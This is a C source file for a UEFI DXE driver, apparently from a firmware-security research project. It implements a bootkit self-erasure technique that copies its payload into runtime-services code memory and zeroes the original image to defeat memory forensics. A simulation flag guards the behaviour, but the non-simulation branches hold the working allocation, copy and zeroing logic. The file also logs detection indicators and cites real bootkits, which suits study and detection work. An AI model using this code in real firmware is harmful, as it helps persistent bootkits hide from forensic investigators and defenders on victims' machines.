/** @file
  Self-Erasure Module - Implementation

  Simulates a bootkit that copies its runtime payload to a new
  EfiRuntimeServicesCode allocation and then zeroes the original
  loaded image pages, preventing post-boot memory forensics from
  locating the DXE driver.

  SIMULATION ONLY — guarded by BARZAKH_RESEARCH.

  Copyright (c) 2026, Barzakh Research Project
  SPDX-License-Identifier: BSD-2-Clause-Patent
**/

#include "SelfErasure.h"
#include <BarzakhMode.h>

EFI_STATUS
EFIAPI
InitializeSelfErasure (
  IN OUT SELF_ERASURE_CONTEXT  *Context,
  IN     EFI_PHYSICAL_ADDRESS  ImageBase,
  IN     UINT64                ImageSize
  )
{
  if (Context == NULL) {
    return EFI_INVALID_PARAMETER;
  }

  if (ImageBase == 0 || ImageSize == 0) {
    return EFI_INVALID_PARAMETER;
  }

  ZeroMem (Context, sizeof (SELF_ERASURE_CONTEXT));

  Context->OriginalImageBase = ImageBase;
  Context->OriginalImageSize = ImageSize;
  Context->RuntimeCopyBase   = 0;
  Context->RuntimeCopySize   = 0;
  Context->RuntimeMemoryType = EfiRuntimeServicesCode;
  Context->CopyComplete      = FALSE;
  Context->ErasureComplete   = FALSE;
  Context->ErasedByteCount   = 0;
  Context->Initialized       = TRUE;

  DEBUG ((
    DEBUG_INFO,
    "[SelfErasure] Initialized — Original image at 0x%lx (size 0x%lx)\n",
    ImageBase,
    ImageSize
    ));

  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
PrepareSelfErasure (
  IN SELF_ERASURE_CONTEXT  *Context
  )
{
  EFI_STATUS            Status;
  EFI_PHYSICAL_ADDRESS  RuntimeBuffer;

  if (Context == NULL || !Context->Initialized) {
    return EFI_NOT_READY;
  }

  if (Context->CopyComplete) {
    DEBUG ((DEBUG_WARN, "[SelfErasure] Already prepared\n"));
    return EFI_ALREADY_STARTED;
  }

  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, "[SelfErasure] === Preparing Runtime Copy ===\n"));
  DEBUG ((DEBUG_INFO, "[SelfErasure]   Allocating EfiRuntimeServicesCode (%lu bytes)\n",
    Context->OriginalImageSize));

  if (SIMULATION_MODE) {
    //
    // In simulation, allocate regular pool memory instead of
    // actual runtime services memory to avoid affecting the system
    //
    RuntimeBuffer = (EFI_PHYSICAL_ADDRESS)(UINTN)AllocatePool (
      (UINTN)Context->OriginalImageSize
      );

    if (RuntimeBuffer == 0) {
      DEBUG ((DEBUG_ERROR, "[SelfErasure] SIMULATION: Pool allocation failed\n"));
      return EFI_OUT_OF_RESOURCES;
    }

    Status = EFI_SUCCESS;
  } else {
    //
    // Real allocation — allocate EfiRuntimeServicesCode pages
    // OS must preserve this memory type per UEFI spec
    //
    Status = gBS->AllocatePages (
      AllocateAnyPages,
      EfiRuntimeServicesCode,
      EFI_SIZE_TO_PAGES (Context->OriginalImageSize),
      &RuntimeBuffer
      );

    if (EFI_ERROR (Status)) {
      DEBUG ((DEBUG_ERROR, "[SelfErasure] Runtime allocation failed: %r\n", Status));
      return EFI_OUT_OF_RESOURCES;
    }
  }

  //
  // Copy payload to runtime allocation
  //
  CopyMem (
    (VOID *)(UINTN)RuntimeBuffer,
    (VOID *)(UINTN)Context->OriginalImageBase,
    (UINTN)Context->OriginalImageSize
    );

  Context->RuntimeCopyBase = RuntimeBuffer;
  Context->RuntimeCopySize = Context->OriginalImageSize;
  Context->CopyComplete    = TRUE;

  DEBUG ((DEBUG_INFO, "[SelfErasure]   Runtime copy at: 0x%lx\n", RuntimeBuffer));
  DEBUG ((DEBUG_INFO, "[SelfErasure]   Memory type: EfiRuntimeServicesCode\n"));
  DEBUG ((DEBUG_INFO, "[SelfErasure]   Technique: OS preserves runtime code regions\n"));
  DEBUG ((DEBUG_INFO, "[SelfErasure] === Preparation Complete ===\n\n"));

  return EFI_SUCCESS;
}

EFI_STATUS
EFIAPI
ExecuteSelfErasure (
  IN SELF_ERASURE_CONTEXT  *Context
  )
{
  if (Context == NULL || !Context->Initialized) {
    return EFI_NOT_READY;
  }

  if (!Context->CopyComplete) {
    DEBUG ((DEBUG_ERROR, "[SelfErasure] Cannot erase — runtime copy not prepared\n"));
    return EFI_NOT_READY;
  }

  if (Context->ErasureComplete) {
    DEBUG ((DEBUG_WARN, "[SelfErasure] Already erased\n"));
    return EFI_ALREADY_STARTED;
  }

  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, "==========================================\n"));
  DEBUG ((DEBUG_INFO, "[SelfErasure] EXECUTING SELF-ERASURE\n"));
  DEBUG ((DEBUG_INFO, "==========================================\n"));
  DEBUG ((DEBUG_INFO, "  Target:  0x%lx (%lu bytes)\n",
    Context->OriginalImageBase, Context->OriginalImageSize));
  DEBUG ((DEBUG_INFO, "  Effect:  Original PE/COFF image zeroed\n"));
  DEBUG ((DEBUG_INFO, "  Purpose: Defeat memory forensics / volatile scanners\n"));
  DEBUG ((DEBUG_INFO, "  Real-world: BlackLotus (2023), CosmicStrand\n"));

  if (SIMULATION_MODE) {
    //
    // Simulation: log what would happen but don't actually zero
    // our own image (which would crash)
    //
    Context->ErasedByteCount = (UINT32)Context->OriginalImageSize;
    Context->ErasureComplete = TRUE;

    DEBUG ((DEBUG_INFO, "  Status:  SIMULATED (no actual zeroing)\n"));
    DEBUG ((DEBUG_INFO, "==========================================\n\n"));
  } else {
    //
    // Real erasure — zero the original loaded image
    //
    ZeroMem (
      (VOID *)(UINTN)Context->OriginalImageBase,
      (UINTN)Context->OriginalImageSize
      );

    Context->ErasedByteCount = (UINT32)Context->OriginalImageSize;
    Context->ErasureComplete = TRUE;

    DEBUG ((DEBUG_INFO, "  Status:  COMPLETE — %d bytes zeroed\n", Context->ErasedByteCount));
    DEBUG ((DEBUG_INFO, "==========================================\n\n"));
  }

  return EFI_SUCCESS;
}

BOOLEAN
EFIAPI
IsSelfErasureComplete (
  IN SELF_ERASURE_CONTEXT  *Context
  )
{
  if (Context == NULL || !Context->Initialized) {
    return FALSE;
  }

  return Context->ErasureComplete;
}

VOID
EFIAPI
LogSelfErasureStatus (
  IN SELF_ERASURE_CONTEXT  *Context
  )
{
  if (Context == NULL || !Context->Initialized) {
    return;
  }

  DEBUG ((DEBUG_INFO, "\n"));
  DEBUG ((DEBUG_INFO, "========================================\n"));
  DEBUG ((DEBUG_INFO, "[SelfErasure] Status Report\n"));
  DEBUG ((DEBUG_INFO, "========================================\n"));
  DEBUG ((DEBUG_INFO, "  Original Image:  0x%lx (size 0x%lx)\n",
    Context->OriginalImageBase, Context->OriginalImageSize));
  DEBUG ((DEBUG_INFO, "  Runtime Copy:    0x%lx (size 0x%lx)\n",
    Context->RuntimeCopyBase, Context->RuntimeCopySize));
  DEBUG ((DEBUG_INFO, "  Copy Complete:   %a\n", Context->CopyComplete ? "YES" : "NO"));
  DEBUG ((DEBUG_INFO, "  Erasure Done:    %a\n", Context->ErasureComplete ? "YES" : "NO"));
  DEBUG ((DEBUG_INFO, "  Erased Bytes:    %d\n", Context->ErasedByteCount));
  DEBUG ((DEBUG_INFO, "  Memory Type:     EfiRuntimeServicesCode\n"));

  if (Context->ErasureComplete) {
    DEBUG ((DEBUG_INFO, "\n"));
    DEBUG ((DEBUG_INFO, "  [!] DETECTION INDICATORS:\n"));
    DEBUG ((DEBUG_INFO, "      - EfiRuntimeServicesCode with no PE header\n"));
    DEBUG ((DEBUG_INFO, "      - Executable code at 0x%lx not in any image\n", Context->RuntimeCopyBase));
    DEBUG ((DEBUG_INFO, "      - Zeroed pages at original load address\n"));
  }

  DEBUG ((DEBUG_INFO, "========================================\n\n"));
}
